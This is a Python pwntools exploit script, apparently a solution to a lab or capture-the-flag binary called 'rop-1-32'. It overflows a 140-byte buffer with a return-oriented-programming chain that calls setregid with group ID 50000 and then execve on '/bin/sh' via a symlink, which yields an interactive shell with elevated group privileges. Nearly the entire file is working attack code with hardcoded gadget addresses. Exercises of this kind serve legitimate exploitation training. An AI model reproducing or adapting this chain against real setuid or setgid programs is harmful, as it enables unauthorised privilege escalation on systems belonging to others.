#!/usr/bin/env python

import os
from pwn import *

# want to do:
#   setregid(50000, 50000)
#   execve("/bin/sh", 0, 0)

# Buffer will look like:
# [...]
# [old-ebp]
# [&setregid]
# [&pop2_ret]
# [50000]
# [50000]
# [&execve]
# [p32(0)]
# [&"/bin/sh"]
# [p32(0)]
# [p32(0)]

# addresses of some syscalls
"""
0x080483b0  __libc_start_main@plt
0x080483c0  execve@plt
0x080483d0  prctl@plt
0x080483e0  setregid@plt
0x08048400  _start
"""

# addresses of some ropgadgets
"""
pop-ret:
    0x0804865b : pop ebp ; ret
pop-pop-ret:
    0x0804865a : pop edi ; pop ebp ; ret
pop-pop-pop-ret:
    0x08048659 : pop esi ; pop edi ; pop ebp ; ret
"""

# set addresses
setregid_addr = p32(0x080483e0)
pop2ret_addr = p32(0x0804865a)
gid = p32(50000)
execve_addr = p32(0x080483c0)
zeros = p32(0)

# build symlink to "/bin/sh"
binsh_addr = p32(0x80485aa)
if os.path.exists("\x01"):
    os.unlink("\x01")
os.symlink("/bin/sh","\x01")

# build buffer
buf = "A"*140 + setregid_addr + pop2ret_addr + gid*2 + execve_addr + zeros + binsh_addr + zeros*2

# run process and send buffer
p = process("./rop-1-32")
p.sendline(buf)
p.interactive()





